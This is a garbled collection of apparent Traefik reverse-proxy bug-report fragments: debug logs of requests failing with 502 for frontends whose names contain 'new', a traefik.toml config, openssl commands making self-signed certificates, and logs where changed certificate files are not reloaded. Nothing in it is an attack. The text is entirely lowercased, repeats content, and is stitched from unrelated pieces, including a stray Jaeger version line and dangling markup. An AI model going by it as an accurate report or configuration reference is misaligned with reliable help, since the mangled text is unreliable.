- new1 - bad
- 1new - ok
- frontend-new - bad
- frontend1-new - bad
- frontend-1new - ok
- 1frontend-new - ok
### if applicable, please paste the log output at debug level (`--loglevel=debug` switch) #### debug log with "new" frontend
time="2018-05-07t03:12:26z" level=debug msg="vulcand/oxy/roundrobin/rebalancer: begin servehttp on request" request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"\\",\\"path\\":\\"/\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/1.1\\",\\"protomajor\\":1,\\"protominor\\":1,\\"header\\":{\\"accept\\":[\\"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\\"],\\"accept-encoding\\":[\\"gzip, deflate\\"],\\"accept-language\\":[\\"ru-ru,ru;q=0.9,en-us;q=0.8,en;q=0.7\\"],\\"connection\\":[\\"keep-alive\\"],\\"cookie\\":[\\"_ga=ga1.2.1001060792.1523939493; _ym_uid=1523939493609979041\\"],\\"upgrade-insecure-requests\\":[\\"1\\"],\\"user-agent\\":[\\"mozilla/5.0 (x11; linux x86_64) applewebkit/537.36 (khtml, like gecko) chrome/66.0.3359.139 safari/537.36\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"new.domain.com\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"192.168.88.99:57820\\",\\"requesturi\\":\\"/\\",\\"tls\\":null}"
time="2018-05-07t03:12:26z" level=debug msg="vulcand/oxy/roundrobin/rebalancer: forwarding this request to url" request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"\\",\\"path\\":\\"/\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/1.1\\",\\"protomajor\\":1,\\"protominor\\":1,\\"header\\":{\\"accept\\":[\\"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\\"],\\"accept-encoding\\":[\\"gzip, deflate\\"],\\"accept-language\\":[\\"ru-ru,ru;q=0.9,en-us;q=0.8,en;q=0.7\\"],\\"connection\\":[\\"keep-alive\\"],\\"cookie\\":[\\"_ga=ga1.2.1001060792.1523939493; _ym_uid=1523939493609979041\\"],\\"upgrade-insecure-requests\\":[\\"1\\"],\\"user-agent\\":[\\"mozilla/5.0 (x11; linux x86_64) applewebkit/537.36 (khtml, like gecko) chrome/66.0.3359.139 safari/537.36\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"new.domain.com\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"192.168.88.99:57820\\",\\"requesturi\\":\\"/\\",\\"tls\\":null}" forwardurl=" "
time="2018-05-07t03:12:26z" level=debug msg="vulcand/oxy/forward: begin servehttp on request" request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"http\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"nsk0-web0.domain.com\\",\\"path\\":\\"\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/1.1\\",\\"protomajor\\":1,\\"protominor\\":1,\\"header\\":{\\"accept\\":[\\"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\\"],\\"accept-encoding\\":[\\"gzip, deflate\\"],\\"accept-language\\":[\\"ru-ru,ru;q=0.9,en-us;q=0.8,en;q=0.7\\"],\\"connection\\":[\\"keep-alive\\"],\\"cookie\\":[\\"_ga=ga1.2.1001060792.1523939493; _ym_uid=1523939493609979041\\"],\\"upgrade-insecure-requests\\":[\\"1\\"],\\"user-agent\\":[\\"mozilla/5.0 (x11; linux x86_64) applewebkit/537.36 (khtml, like gecko) chrome/66.0.3359.139 safari/537.36\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"new.domain.com\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"192.168.88.99:57820\\",\\"requesturi\\":\\"/\\",\\"tls\\":null}"
time="2018-05-07t03:12:26z" level=debug msg="vulcand/oxy/forward/http: begin servehttp on request" request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"http\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"nsk0-web0.domain.com\\",\\"path\\":\\"\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/1.1\\",\\"protomajor\\":1,\\"protominor\\":1,\\"header\\":{\\"accept\\":[\\"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\\"],\\"accept-encoding\\":[\\"gzip, deflate\\"],\\"accept-language\\":[\\"ru-ru,ru;q=0.9,en-us;q=0.8,en;q=0.7\\"],\\"connection\\":[\\"keep-alive\\"],\\"cookie\\":[\\"_ga=ga1.2.1001060792.1523939493; _ym_uid=1523939493609979041\\"],\\"upgrade-insecure-requests\\":[\\"1\\"],\\"user-agent\\":[\\"mozilla/5.0 (x11; linux x86_64) applewebkit/537.36 (khtml, like gecko) chrome/66.0.3359.139 safari/537.36\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"new.domain.com\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"192.168.88.99:57820\\",\\"requesturi\\":\\"/\\",\\"tls\\":null}"
time="2018-05-07t03:12:26z" level=debug msg="vulcand/oxy/forward/http: round trip: code: 502, length: 575, duration: 5.915423ms"
time="2018-05-07t03:12:26z" level=debug msg="vulcand/oxy/forward/http: completed servehttp on request" request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"http\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"nsk0-web0.domain.com\\",\\"path\\":\\"\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/1.1\\",\\"protomajor\\":1,\\"protominor\\":1,\\"header\\":{\\"accept\\":[\\"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\\"],\\"accept-encoding\\":[\\"gzip, deflate\\"],\\"accept-language\\":[\\"ru-ru,ru;q=0.9,en-us;q=0.8,en;q=0.7\\"],\\"connection\\":[\\"keep-alive\\"],\\"cookie\\":[\\"_ga=ga1.2.1001060792.1523939493; _ym_uid=1523939493609979041\\"],\\"upgrade-insecure-requests\\":[\\"1\\"],\\"user-agent\\":[\\"mozilla/5.0 (x11; linux x86_64) applewebkit/537.36 (khtml, like gecko) chrome/66.0.3359.139 safari/537.36\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"new.domain.com\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"192.168.88.99:57820\\",\\"requesturi\\":\\"/\\",\\"tls\\":null}"
time="2018-05-07t03:12:26z" level=debug msg="vulcand/oxy/forward: completed servehttp on request" request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"http\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"nsk0-web0.domain.com\\",\\"path\\":\\"\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/1.1\\",\\"protomajor\\":1,\\"protominor\\":1,\\"header\\":{\\"accept\\":[\\"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\\"],\\"accept-encoding\\":[\\"gzip, deflate\\"],\\"accept-language\\":[\\"ru-ru,ru;q=0.9,en-us;q=0.8,en;q=0.7\\"],\\"connection\\":[\\"keep-alive\\"],\\"cookie\\":[\\"_ga=ga1.2.1001060792.1523939493; _ym_uid=1523939493609979041\\"],\\"upgrade-insecure-requests\\":[\\"1\\"],\\"user-agent\\":[\\"mozilla/5.0 (x11; linux x86_64) applewebkit/537.36 (khtml, like gecko) chrome/66.0.3359.139 safari/537.36\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"new.domain.com\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"192.168.88.99:57820\\",\\"requesturi\\":\\"/\\",\\"tls\\":null}"
time="2018-05-07t03:12:26z" level=debug msg="vulcand/oxy/roundrobin/rebalancer: competed servehttp on request" request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"\\",\\"path\\":\\"/\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/1.1\\",\\"protomajor\\":1,\\"protominor\\":1,\\"header\\":{\\"accept\\":[\\"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\\"],\\"accept-encoding\\":[\\"gzip, deflate\\"],\\"accept-language\\":[\\"ru-ru,ru;q=0.9,en-us;q=0.8,en;q=0.7\\"],\\"connection\\":[\\"keep-alive\\"],\\"cookie\\":[\\"_ga=ga1.2.1001060792.1523939493; _ym_uid=1523939493609979041\\"],\\"upgrade-insecure-requests\\":[\\"1\\"],\\"user-agent\\":[\\"mozilla/5.0 (x11; linux x86_64) applewebkit/537.36 (khtml, like gecko) chrome/66.0.3359.139 safari/537.36\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"new.domain.com\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"192.168.88.99:57820\\",\\"requesturi\\":\\"/\\",\\"tls\\":null}"
#### debug log with "front-new" frontend ```
time="2018-05-07t03:16:36z" level=debug msg="basic auth failed"
time="2018-05-07t03:16:47z" level=debug msg="basic auth succeeded"
time="2018-05-07t03:16:47z" level=debug msg="vulcand/oxy/roundrobin/rebalancer: begin servehttp on request" request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"\\",\\"opaque\\":\\"\\",\\"user\\":{},\\"host\\":\\"\\",\\"path\\":\\"/\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"accept\\":[\\"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\\"],\\"accept-encoding\\":[\\"gzip, deflate, br\\"],\\"accept-language\\":[\\"ru-ru,ru;q=0.9,en-us;q=0.8,en;q=0.7\\"],\\"authorization\\":[\\"basic dgvzddp0zxn0\\"],\\"cache-control\\":[\\"max-age=0\\"],\\"cookie\\":[\\"_ga=ga1.2.1001060792.1523939493; _ym_uid=1523939493609979041\\"],\\"upgrade-insecure-requests\\":[\\"1\\"],\\"user-agent\\":[\\"mozilla/5.0 (x11; linux x86_64) applewebkit/537.36 (khtml, like gecko) chrome/66.0.3359.139 safari/537.36\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"new.domain.com\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"192.168.88.99:54046\\",\\"requesturi\\":\\"/\\",\\"tls\\":null}"
time="2018-05-07t03:16:47z" level=debug msg="vulcand/oxy/roundrobin/rebalancer: forwarding this request to url" request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"\\",\\"opaque\\":\\"\\",\\"user\\":{},\\"host\\":\\"\\",\\"path\\":\\"/\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"accept\\":[\\"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\\"],\\"accept-encoding\\":[\\"gzip, deflate, br\\"],\\"accept-language\\":[\\"ru-ru,ru;q=0.9,en-us;q=0.8,en;q=0.7\\"],\\"authorization\\":[\\"basic dgvzddp0zxn0\\"],\\"cache-control\\":[\\"max-age=0\\"],\\"cookie\\":[\\"_ga=ga1.2.1001060792.1523939493; _ym_uid=1523939493609979041\\"],\\"upgrade-insecure-requests\\":[\\"1\\"],\\"user-agent\\":[\\"mozilla/5.0 (x11; linux x86_64) applewebkit/537.36 (khtml, like gecko) chrome/66.0.3359.139 safari/537.36\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"new.domain.com\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"192.168.88.99:54046\\",\\"requesturi\\":\\"/\\",\\"tls\\":null}" forwardurl=" "
time="2018-05-07t03:16:47z" level=debug msg="vulcand/oxy/forward: begin servehttp on request" request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"http\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"nsk0-web0.domain.com\\",\\"path\\":\\"\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"accept\\":[\\"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\\"],\\"accept-encoding\\":[\\"gzip, deflate, br\\"],\\"accept-language\\":[\\"ru-ru,ru;q=0.9,en-us;q=0.8,en;q=0.7\\"],\\"authorization\\":[\\"basic dgvzddp0zxn0\\"],\\"cache-control\\":[\\"max-age=0\\"],\\"cookie\\":[\\"_ga=ga1.2.1001060792.1523939493; _ym_uid=1523939493609979041\\"],\\"upgrade-insecure-requests\\":[\\"1\\"],\\"user-agent\\":[\\"mozilla/5.0 (x11; linux x86_64) applewebkit/537.36 (khtml, like gecko) chrome/66.0.3359.139 safari/537.36\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"new.domain.com\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"192.168.88.99:54046\\",\\"requesturi\\":\\"/\\",\\"tls\\":null}"
time="2018-05-07t03:16:47z" level=debug msg="vulcand/oxy/forward/http: begin servehttp on request" request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"http\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"nsk0-web0.domain.com\\",\\"path\\":\\"\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"accept\\":[\\"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\\"],\\"accept-encoding\\":[\\"gzip, deflate, br\\"],\\"accept-language\\":[\\"ru-ru,ru;q=0.9,en-us;q=0.8,en;q=0.7\\"],\\"authorization\\":[\\"basic dgvzddp0zxn0\\"],\\"cache-control\\":[\\"max-age=0\\"],\\"cookie\\":[\\"_ga=ga1.2.1001060792.1523939493; _ym_uid=1523939493609979041\\"],\\"upgrade-insecure-requests\\":[\\"1\\"],\\"user-agent\\":[\\"mozilla/5.0 (x11; linux x86_64) applewebkit/537.36 (khtml, like gecko) chrome/66.0.3359.139 safari/537.36\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"new.domain.com\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"192.168.88.99:54046\\",\\"requesturi\\":\\"/\\",\\"tls\\":null}"
time="2018-05-07t03:16:47z" level=debug msg="vulcand/oxy/forward/http: round trip: code: 502, length: 575, duration: 6.04039ms tls:version: 303, tls:resume:false, tls:csuite:cca8, tls:server:new.domain.com"
time="2018-05-07t03:16:47z" level=debug msg="vulcand/oxy/forward/http: completed servehttp on request" request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"http\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"nsk0-web0.domain.com\\",\\"path\\":\\"\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"accept\\":[\\"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\\"],\\"accept-encoding\\":[\\"gzip, deflate, br\\"],\\"accept-language\\":[\\"ru-ru,ru;q=0.9,en-us;q=0.8,en;q=0.7\\"],\\"authorization\\":[\\"basic dgvzddp0zxn0\\"],\\"cache-control\\":[\\"max-age=0\\"],\\"cookie\\":[\\"_ga=ga1.2.1001060792.1523939493; _ym_uid=1523939493609979041\\"],\\"upgrade-insecure-requests\\":[\\"1\\"],\\"user-agent\\":[\\"mozilla/5.0 (x11; linux x86_64) applewebkit/537.36 (khtml, like gecko) chrome/66.0.3359.139 safari/537.36\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"new.domain.com\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"192.168.88.99:54046\\",\\"requesturi\\":\\"/\\",\\"tls\\":null}"
time="2018-05-07t03:16:47z" level=debug msg="vulcand/oxy/forward: completed servehttp on request" request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"http\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"nsk0-web0.domain.com\\",\\"path\\":\\"\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"accept\\":[\\"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\\"],\\"accept-encoding\\":[\\"gzip, deflate, br\\"],\\"accept-language\\":[\\"ru-ru,ru;q=0.9,en-us;q=0.8,en;q=0.7\\"],\\"authorization\\":[\\"basic dgvzddp0zxn0\\"],\\"cache-control\\":[\\"max-age=0\\"],\\"cookie\\":[\\"_ga=ga1.2.1001060792.1523939493; _ym_uid=1523939493609979041\\"],\\"upgrade-insecure-requests\\":[\\"1\\"],\\"user-agent\\":[\\"mozilla/5.0 (x11; linux x86_64) applewebkit/537.36 (khtml, like gecko) chrome/66.0.3359.139 safari/537.36\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"new.domain.com\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"192.168.88.99:54046\\",\\"requesturi\\":\\"/\\",\\"tls\\":null}"
time="2018-05-07t03:16:47z" level=debug msg="vulcand/oxy/roundrobin/rebalancer: competed servehttp on request" request="{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"\\",\\"opaque\\":\\"\\",\\"user\\":{},\\"host\\":\\"\\",\\"path\\":\\"/\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/2.0\\",\\"protomajor\\":2,\\"protominor\\":0,\\"header\\":{\\"accept\\":[\\"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\\"],\\"accept-encoding\\":[\\"gzip, deflate, br\\"],\\"accept-language\\":[\\"ru-ru,ru;q=0.9,en-us;q=0.8,en;q=0.7\\"],\\"authorization\\":[\\"basic dgvzddp0zxn0\\"],\\"cache-control\\":[\\"max-age=0\\"],\\"cookie\\":[\\"_ga=ga1.2.1001060792.1523939493; _ym_uid=1523939493609979041\\"],\\"upgrade-insecure-requests\\":[\\"1\\"],\\"user-agent\\":[\\"mozilla/5.0 (x11; linux x86_64) applewebkit/537.36 (khtml, like gecko) chrome/66.0.3359.139 safari/537.36\\"]},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"new.domain.com\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"192.168.88.99:54046\\",\\"requesturi\\":\\"/\\",\\"tls\\":null}"
all jaegertracing components: `1.4.1`
watch = true
loglevel = "debug"
accesslogsfile = "/dev/stdout" [entrypoints] [entrypoints.http] address = ":80" [entrypoints.http.redirect] entrypoint = "https" [entrypoints.https] address = ":443" [entrypoints.https.tls] [backends] [backends.backend] [backends.backend1] url = " " weight = 2 [frontends] [frontends.frontend1] backend = "backend1" entrypoints = ["http", "https"] [frontends.frontend1.routes.test] [[tls]] entrypoints = ["http", "https"] [tls.certificate] certfile = "/etc/traefik/frontend1.crt" keyfile = "/etc/traefik/frontend1.key"
watch = true
loglevel = "debug"
accesslogsfile = "/dev/stdout" [entrypoints] [entrypoints.http] address = ":80" [entrypoints.http.redirect] entrypoint = "https" [entrypoints.https] address = ":443" [entrypoints.https.tls] [backends] [backends.backend] [backends.backend1] url = " " weight = 2 [frontends] [frontends.frontend1] backend = "backend1" entrypoints = ["http", "https"] [frontends.frontend1.routes.test] [[tls]] entrypoints = ["http", "https"] [tls.certificate] certfile = "/etc/traefik/frontend1.crt" keyfile = "/etc/traefik/frontend1.key"
--> ### if applicable, please paste the log output at debug level (`--loglevel=debug` switch) ```
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout ./frontend1.key -out ./frontend1.crt -subj '/c=us/st=oregon/l=portland/cn=cert2' in logs:
level=info msg="skipping same configuration for provider file"
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout ./frontend1.key -out ./frontend1.crt -subj \'/c=us/st=oregon/l=portland/cn=cert1\' touch traefik.toml may 06 05:20:38 traefik docker[3994]: time="2018-05-06t05:20:38z" level=debug msg="configuration received from provider file: {\\"backends\\":{\\"backend\\":{\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}},\\"backend1\\":{\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}}},\\"frontends\\":{\\"frontend1\\":{\\"entrypoints\\":[\\"http\\",\\"https\\"],\\"backend\\":\\"backend1\\",\\"routes\\":{\\"test\\":{}},\\"priority\\":0,\\"basicauth\\":null}},\\"tls\\":[{\\"entrypoints\\":[\\"http\\",\\"https\\"],\\"certificate\\":{\\"certfile\\":\\"/etc/traefik/frontend1.crt\\",\\"keyfile\\":\\"/etc/traefik/frontend1.key\\"}}]}"
may 06 05:20:38 traefik docker[3994]: time="2018-05-06t05:20:38z" level=info msg="skipping same configuration for provider file"
``` create new cert with different common name:
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout ./frontend1.key -out ./frontend1.crt -subj \'/c=us/st=oregon/l=portland/cn=cert2\' may 06 05:23:31 traefik docker[3994]: time="2018-05-06t05:23:31z" level=debug msg="configuration received from provider file: {\\"backends\\":{\\"backend\\":{\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}},\\"backend1\\":{\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}}},\\"frontends\\":{\\"frontend1\\":{\\"entrypoints\\":[\\"http\\",\\"https\\"],\\"backend\\":\\"backend1\\",\\"routes\\":{\\"test\\":{}},\\"priority\\":0,\\"basicauth\\":null}},\\"tls\\":[{\\"entrypoints\\":[\\"http\\",\\"https\\"],\\"certificate\\":{\\"certfile\\":\\"/etc/traefik/frontend1.crt\\",\\"keyfile\\":\\"/etc/traefik/frontend1.key\\"}}]}"
may 06 05:23:31 traefik docker[3994]: time="2018-05-06t05:23:31z" level=info msg="skipping same configuration for provider file" touch traefik.toml may 06 05:26:07 traefik docker[3994]: time="2018-05-06t05:26:07z" level=debug msg="configuration received from provider file: {\\"backends\\":{\\"backend\\":{\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}},\\"backend1\\":{\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}}},\\"frontends\\":{\\"frontend1\\":{\\"entrypoints\\":[\\"http\\",\\"https\\"],\\"backend\\":\\"backend1\\",\\"routes\\":{\\"test\\":{}},\\"priority\\":0,\\"basicauth\\":null}},\\"tls\\":[{\\"entrypoints\\":[\\"http\\",\\"https\\"],\\"certificate\\":{\\"certfile\\":\\"/etc/traefik/frontend1.crt\\",\\"keyfile\\":\\"/etc/traefik/frontend1.key\\"}}]}"
may 06 05:26:07 traefik docker[3994]: time="2018-05-06t05:26:07z" level=info msg="skipping same configuration for provider file"
``` but if i change the name of the certificate in the traefik.toml file change is detected and loaded.
cp frontend1.crt frontend.crt
cp frontend1.key frontend.key may 06 05:46:39 traefik docker[3994]: time="2018-05-06t05:46:39z" level=info msg="skipping same configuration for provider file" sed -i \'s/\\/frontend1/\\/frontend/g\' traefik.toml # as shown below renaming cert in traefik.toml makes traefik detect and load copied certs
may 06 05:47:56 traefik docker[3994]: time="2018-05-06t05:47:56z" level=debug msg="configuration received from provider file: {\\"backends\\":{\\"backend\\":{\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}},\\"backend1\\":{\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}}},\\"frontends\\":{\\"frontend1\\":{\\"entrypoints\\":[\\"http\\",\\"https\\"],\\"backend\\":\\"backend1\\",\\"routes\\":{\\"test\\":{}},\\"priority\\":0,\\"basicauth\\":null}},\\"tls\\":[{\\"entrypoints\\":[\\"http\\",\\"https\\"],\\"certificate\\":{\\"certfile\\":\\"/etc/traefik/frontend.crt\\",\\"keyfile\\":\\"/etc/traefik/frontend.key\\"}}]}"
may 06 05:47:56 traefik docker[3994]: time="2018-05-06t05:47:56z" level=debug msg="creating frontend frontend1"
may 06 05:47:56 traefik docker[3994]: time="2018-05-06t05:47:56z" level=debug msg="wiring frontend frontend1 to entrypoint http"
may 06 05:47:56 traefik docker[3994]: time="2018-05-06t05:47:56z" level=error msg="error creating route for frontend frontend1: error parsing rule: empty rule"
may 06 05:47:56 traefik docker[3994]: time="2018-05-06t05:47:56z" level=error msg="skipping frontend frontend1..."
may 06 05:47:56 traefik docker[3994]: time="2018-05-06t05:47:56z" level=debug msg="add certificate for domains cert2"
may 06 05:47:56 traefik docker[3994]: time="2018-05-06t05:47:56z" level=debug msg="validation of load balancer method for backend backend failed: invalid load-balancing method \'\'
using default method wrr."
may 06 05:47:56 traefik docker[3994]: time="2018-05-06t05:47:56z" level=debug msg="validation of load balancer method for backend backend1 failed: invalid load-balancing method \'\'
using default method wrr."
may 06 05:47:56 traefik docker[3994]: time="2018-05-06t05:47:56z" level=debug msg="configuration received from provider file: {\\"backends\\":{\\"backend\\":{\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}},\\"backend1\\":{\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}}},\\"frontends\\":{\\"frontend1\\":{\\"entrypoints\\":[\\"http\\",\\"https\\"],\\"backend\\":\\"backend1\\",\\"routes\\":{\\"test\\":{}},\\"priority\\":0,\\"basicauth\\":null}},\\"tls\\":[{\\"entrypoints\\":[\\"http\\",\\"https\\"],\\"certificate\\":{\\"certfile\\":\\"/etc/traefik/frontend.crt\\",\\"keyfile\\":\\"/etc/traefik/frontend.key\\"}}]}"
may 06 05:47:56 traefik docker[3994]: time="2018-05-06t05:47:56z" level=debug msg="add certificate for domains cert2"
may 06 05:47:56 traefik docker[3994]: time="2018-05-06t05:47:56z" level=info msg="server configuration reloaded on :8080"
may 06 05:47:56 traefik docker[3994]: time="2018-05-06t05:47:56z" level=debug msg="certificates not added to non-tls entrypoint http."
may 06 05:47:56 traefik docker[3994]: time="2018-05-06t05:47:56z" level=info msg="server configuration reloaded on :80"
may 06 05:47:56 traefik docker[3994]: time="2018-05-06t05:47:56z" level=info msg="server configuration reloaded on :443"
may 06 05:47:58 traefik docker[3994]: time="2018-05-06t05:47:58z" level=debug msg="creating frontend frontend1"
may 06 05:47:58 traefik docker[3994]: time="2018-05-06t05:47:58z" level=debug msg="wiring frontend frontend1 to entrypoint http"
may 06 05:47:58 traefik docker[3994]: time="2018-05-06t05:47:58z" level=error msg="error creating route for frontend frontend1: error parsing rule: empty rule"
may 06 05:47:58 traefik docker[3994]: time="2018-05-06t05:47:58z" level=error msg="skipping frontend frontend1..."
may 06 05:47:58 traefik docker[3994]: time="2018-05-06t05:47:58z" level=debug msg="add certificate for domains cert2"
may 06 05:47:58 traefik docker[3994]: time="2018-05-06t05:47:58z" level=info msg="server configuration reloaded on :8080"
may 06 05:47:58 traefik docker[3994]: time="2018-05-06t05:47:58z" level=debug msg="certificates not added to non-tls entrypoint http."
may 06 05:47:58 traefik docker[3994]: time="2018-05-06t05:47:58z" level=info msg="server configuration reloaded on :80"
may 06 05:47:58 traefik docker[3994]: time="2018-05-06t05:47:58z" level=info msg="server configuration reloaded on :443"
<summary>config</summary> ```json
